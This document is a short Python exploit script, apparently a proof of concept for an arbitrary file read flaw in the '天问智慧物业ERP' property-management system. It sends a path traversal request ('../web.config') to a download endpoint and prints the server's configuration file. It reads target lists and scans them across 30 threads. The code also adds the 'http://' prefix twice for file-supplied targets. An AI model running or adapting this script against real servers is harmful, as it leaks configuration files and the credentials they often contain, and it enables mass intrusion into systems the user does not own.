import requests
import sys
import argparse
from multiprocessing.dummy import Pool

def send_request(host):
    # 构造请求的 URL
    url = f"http://{host}/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config"

    # 设置请求头
    headers ={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }

    try:
        # 发送 GET 请求
        response = requests.get(url, headers=headers)

        # 打印响应状态码和内容
        print(f"状态码: {response.status_code}")
        print("响应体:")
        print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def main():
    parse = argparse.ArgumentParser(description="天问智慧物业ERP多处接口任意文件读取漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)

    try:
        targets = []
        if args.url:
            send_request(args.url)
        elif args.file:
            with open(args.file, 'r') as f:
                for target in f.readlines():
                    target = target.strip()
                    if target:  # 确保不添加空行
                        # 增加协议
                        if not target.startswith(('http://', 'https://')):
                            target = 'http://' + target
                        targets.append(target)

        # 调用多线程去执行检测函数
        pool.map(send_request, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息: {e}")
if __name__ == '__main__':
    main()